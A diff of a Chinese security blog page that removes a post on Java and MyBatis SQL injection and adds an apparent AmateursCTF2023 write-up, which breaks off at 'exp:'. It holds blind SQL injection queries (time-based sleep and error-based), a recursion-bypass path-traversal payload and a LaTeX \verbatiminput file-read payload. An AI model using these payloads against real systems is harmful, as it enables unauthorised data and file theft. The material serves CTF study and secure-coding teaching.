@@ -185,170 +185,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">java注入学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-16 20:56:44" itemprop="dateCreated datePublished" datetime="2024-03-16T20:56:44+08:00">2024-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-17 17:26:32" itemprop="dateModified" datetime="2024-03-17T17:26:32+08:00">2024-03-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="JDBC是什么"><a href="#JDBC是什么" class="headerlink" title="JDBC是什么"></a>JDBC是什么</h3><p><strong>J</strong>ava <strong>D</strong>ata<strong>B</strong>ase <strong>C</strong>onnectivity（Java语言连接数据库）</p>
-<table>
-<thead>
-<tr>
-<th>接口或类</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>DriverManager类</strong></td>
-<td>1)管理和注册数据库驱动<br>2)得到数据库连接对象</td>
-</tr>
-<tr>
-<td><strong>Connection接口</strong></td>
-<td>一个连接对象，可用于创建Statement和PreparedStatement对象</td>
-</tr>
-<tr>
-<td><strong>Statemen接口</strong></td>
-<td>一个SQL语句对象，用于将SQL语句发送给数据库服务器</td>
-</tr>
-<tr>
-<td><strong>PreparedStetemen接口</strong></td>
-<td>一个SQL语句对象，是Statemen的子接口</td>
-</tr>
-<tr>
-<td><strong>ResultSet接口</strong></td>
-<td>用于封装数据库查询的结果集，返回给数据库Java程序</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>加载和注册驱动的方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Class.forName(数据库驱动实现类)</strong></td>
-<td>加载和注册数据库驱动，数据库驱动由mysql厂商”com.mysql.jbdc.Driver”</td>
-</tr>
-</tbody></table>
-<p>PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</p>
-<p>Statement不会对SQL语句进行预编译。</p>
-<p>两种操作都是因为SQL语句拼接导致的SQL注入。</p>
-<h2 id="MyBatis框架"><a href="#MyBatis框架" class="headerlink" title="MyBatis框架"></a>MyBatis框架</h2><p>在mybatis中的，使用<code>#</code>包裹的字段在内部进行了预编译处理，而<code>$</code>并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。</p>
-<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><p>在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。</p>
-<p>我的理解就是通过order by将列进行排序，通过返回的不同结果</p>
-<p>举个简单的例子:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (5.004 sec)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s</p>
-<p>这是基于时间的盲注。</p>
-<p>还可以利用其它的方式来进行盲注</p>
-<p>例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> if(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,(<span class="keyword">select</span> host <span class="keyword">from</span> mysql.user));</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure>
-
-<p>如果if语句错误就会返回<code>ERROR 1242 (21000): Subquery returns more than 1 row</code>，当if成立时就会返回正常页面，可以通过返回的情况来判断。</p>
-<h3 id="rand-盲注"><a href="#rand-盲注" class="headerlink" title="rand()盲注"></a>rand()盲注</h3><p>原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。</p>
-<p>比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rand(1)</span><br><span class="line">rand(0)</span><br><span class="line">rand(1=1)</span><br><span class="line">rand(lenth(database())=8)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<h3 id="和-符号的区别"><a href="#和-符号的区别" class="headerlink" title="#和$符号的区别"></a>#和$符号的区别</h3><p><strong>#{}</strong> </p>
-<p>使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id=’2’ 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。</p>
-<p><strong>${}</strong></p>
-<p>使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2</p>
-<p>从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如，</p>
-<p>select * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id</p>
-<p>如果是使用#{} 则变成了select * from ‘table1’ order by ‘id’ 我们知道这样就不对了。</p>
-<p>另，在使用以下的配置时，必须使用#{}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt;</span><br><span class="line">         </span><br><span class="line">         select * from message where id=#&#123;id&#125;;</span><br><span class="line">     &lt;/select&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在parameterType是int时，sql语句中必须是#{}。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/360733.html">关于Java中order by注入详解</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1398,6 +1234,141 @@
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2023/07/19/AmateursCTF2023/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lvzhouhang">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lvzhouhang">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/07/19/AmateursCTF2023/" class="post-title-link" itemprop="url">AmateursCTF2023</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-07-19 16:52:42" itemprop="dateCreated datePublished" datetime="2023-07-19T16:52:42+08:00">2023-07-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-20 22:07:56" itemprop="dateModified" datetime="2023-07-20T22:07:56+08:00">2023-07-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="waiting-an-eternity"><a href="#waiting-an-eternity" class="headerlink" title="waiting-an-eternity"></a>waiting-an-eternity</h2><p><img src="/pic/AmateursCTF/web1.png"></p>
+<p>看文件头，要等好长事件之后才会刷新,直接访问后面的url</p>
+<p><img src="/pic/AmateursCTF/web2.png"></p>
+<p>secretcode是md5解密，但是没什么用，Cookie里有<code>time</code>是时间戳将他改成<code>NAN</code>显示flag</p>
+<p><img src="/pic/AmateursCTF/web3.png"></p>
+<h2 id="funny-factorials"><a href="#funny-factorials" class="headerlink" title="funny factorials"></a>funny factorials</h2><p>附件给了一个app.py</p>
+<p>可控点在这里，通过改变主题得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def filter_path(path):</span><br><span class="line">    # print(path)</span><br><span class="line">    path = path.replace(&quot;../&quot;, &quot;&quot;)</span><br><span class="line">    try:</span><br><span class="line">        return filter_path(path)</span><br><span class="line">    except RecursionError:</span><br><span class="line">        # remove root / from path if it exists</span><br><span class="line">        if path[0] == &quot;/&quot;:</span><br><span class="line">            path = path[1:]</span><br><span class="line">        print(path)</span><br><span class="line">        return path</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>将path里面的<code>../</code>删掉了，如果path开头是<code>/</code>会忽视掉，但是如果递归超过1000次就会进入<code>RecursionError</code>然后访问根目录下的flag.txt就行</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /?theme=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../..///flag.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="latek"><a href="#latek" class="headerlink" title="latek"></a>latek</h2><p>关于latek可以看看这篇文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/security-management/308191.html">https://www.freebuf.com/articles/security-management/308191.html</a></p>
+<p><img src="/pic/AmateursCTF/web4.png"></p>
+<p>直接用\input的话flag输出不完全，问了chatgpt可以用其他方法进行任意文件读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\documentclass&#123;article&#125;</span><br><span class="line">\usepackage&#123;verbatim&#125;</span><br><span class="line">\begin&#123;document&#125;</span><br><span class="line">Hello, world!</span><br><span class="line">\verbatiminput&#123;/flag.txt&#125;</span><br><span class="line">\end&#123;document&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h1><h2 id="volcano"><a href="#volcano" class="headerlink" title="volcano"></a>volcano</h2><p>ida分析，先看main函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+10h] [rbp-C0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-B8h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// [rsp+20h] [rbp-B0h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+30h] [rbp-A0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+B8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a bear: &quot;</span>);</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v7);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_12BB(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;That doesn&#x27;t look like a bear!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me a volcano: &quot;</span>);</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v8);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)sub_13D9(v8) != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;That doesn&#x27;t look like a volcano!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Prove to me they are the same: &quot;</span>);</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      v10 = <span class="number">4919LL</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%llu&quot;</span>, &amp;v9);</span><br><span class="line">      <span class="keyword">if</span> ( (v9 &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; v9 != <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = sub_1209(v8);</span><br><span class="line">        <span class="keyword">if</span> ( v4 == sub_1209(v7)</span><br><span class="line">          &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class="line">          &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;That looks right to me!&quot;</span>);</span><br><span class="line">          stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">          fgets(s, <span class="number">128</span>, stream);</span><br><span class="line">          <span class="built_in">puts</span>(s);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Nope that&#x27;s not right!&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not a valid proof!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看<code>sub_12BB</code>和<code>sub_13D9</code>这两个</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">sub_12BB</span><span class="params">(<span class="type">unsigned</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (a1 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">3</span> != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">5</span> != <span class="number">1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a1 % <span class="number">7</span> == <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> a1 % <span class="number">109</span> == <span class="number">55</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall sub_13D9(unsigned __int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = 0LL;</span><br><span class="line">  while ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 += a1 &amp; 1;</span><br><span class="line">    a1 &gt;&gt;= 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2 &gt; 16 &amp;&amp; v2 &lt;= 26;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>逻辑很简单，写脚本爆破一下就行</p>
+<p>看后面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( v4 == sub_1209(v7)</span><br><span class="line">         &amp;&amp; (v5 = sub_124D(v8), v5 == sub_124D(v7))</span><br><span class="line">         &amp;&amp; (v6 = sub_1430(v10, v8, v9), v6 == sub_1430(v10, v7, v9)) )</span><br></pre></td></tr></table></figure>
+
+<p>前几个完全没用只用考虑最后一个括号里的内容就行。</p>
+<p>sub_1430:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1430</span><span class="params">(<span class="type">unsigned</span> __int64 a1, <span class="type">unsigned</span> __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+20h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">1LL</span>;</span><br><span class="line">  v5 = a1 % a3;</span><br><span class="line">  <span class="keyword">while</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (a2 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">      v6 = v5 * v6 % a3;</span><br><span class="line">    a2 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    v5 = v5 * v5 % a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接写脚本爆破就行了</p>
+<p>exp:</p>
